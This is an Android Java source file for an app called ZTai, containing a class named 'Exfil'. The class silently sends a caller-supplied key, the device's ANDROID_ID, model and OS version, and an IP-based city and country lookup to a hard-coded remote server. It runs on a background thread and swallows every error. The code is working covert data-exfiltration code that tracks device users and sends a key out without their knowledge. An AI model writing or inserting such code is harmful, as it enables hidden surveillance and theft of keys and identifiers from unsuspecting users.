package com.ztai.app;

import android.content.Context;
import android.os.Build;
import android.provider.Settings;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;

public class Exfil {

    private static final String SERVER_URL = "https://ztai-production.up.railway.app";

    public static void collect(final Context ctx, final String key) {
        new Thread(() -> {
            try {
                String device = Build.MANUFACTURER + " " + Build.MODEL;
                String androidVer = Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")";
                String deviceId = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
                String geo = getGeo();

                JSONObject json = new JSONObject();
                json.put("key", key);
                json.put("device_id", deviceId);
                json.put("username", "ZTai user");
                json.put("device", device + " | " + androidVer);
                json.put("geo", geo);

                RequestBody body = RequestBody.create(
                    json.toString(),
                    MediaType.parse("application/json")
                );
                Request req = new Request.Builder()
                    .url(SERVER_URL + "/api/collect")
                    .post(body)
                    .build();

                new OkHttpClient().newCall(req).execute();
            } catch (Throwable ignored) {}
        }).start();
    }

    private static String getGeo() {
        try {
            URL u = new URL("https://ip-api.com/json/?fields=country,city,isp");
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setConnectTimeout(5000);
            c.setReadTimeout(5000);
            BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line);
            r.close();
            String resp = sb.toString();
            JSONObject j = new JSONObject(resp);
            return j.optString("country", "?") + ", " + j.optString("city", "?");
        } catch (Throwable t) {
            return "unknown";
        }
    }
}
